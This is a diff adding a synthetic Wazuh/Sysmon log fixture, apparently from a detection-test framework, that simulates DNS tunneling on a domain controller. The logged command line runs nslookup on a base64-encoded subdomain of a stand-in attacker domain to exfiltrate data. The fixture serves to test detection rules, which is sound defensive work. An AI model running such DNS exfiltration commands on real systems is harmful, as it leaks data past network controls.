@@ -1,0 +1,68 @@
+{
+  "_metadata": {
+    "attack_id": "T1071.004",
+    "variation": "001",
+    "name": "DNS Tunneling via Long Subdomain",
+    "description": "Attacker uses DNS queries with encoded data in subdomain for C2 communication or data exfiltration",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "command-and-control",
+    "format": "wazuh-native",
+    "format_version": "1.0",
+    "campaign": "dns-attack-simulation"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - DNS tunneling query",
+      "sequence": 1,
+      "timestamp": "2026-02-04T23:05:00.000Z",
+      "log": {
+        "timestamp": "2026-02-04T23:05:00.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process Create",
+          "id": "92000",
+          "mitre": {
+            "id": ["T1071.004"],
+            "tactic": ["Command and Control"],
+            "technique": ["Application Layer Protocol: DNS"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event1"]
+        },
+        "agent": {"id": "003", "name": "DC01", "ip": "10.0.10.10"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1706922300.000001",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.Pooka.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-04 23:05:00.000",
+              "processGuid": "{DC01-DNS02-0001-0001-000000000001}",
+              "processId": "6200",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "commandLine": "nslookup c2VjcmV0ZGF0YWV4ZmlsdHJhdGlvbg.exfil.attacker.com 8.8.8.8",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "POOKA\\Administrator",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{DC01-DNS02-0001-0001-000000000000}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        },
+        "_fomorian_batch": "dns-attack-simulation",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1071.004",
+        "_fomorian_expected_detection": "Sigma: DNS Tunneling Suspicion - Long Subdomain (T1071.004)"
+      }
+    }
+  ]
+}
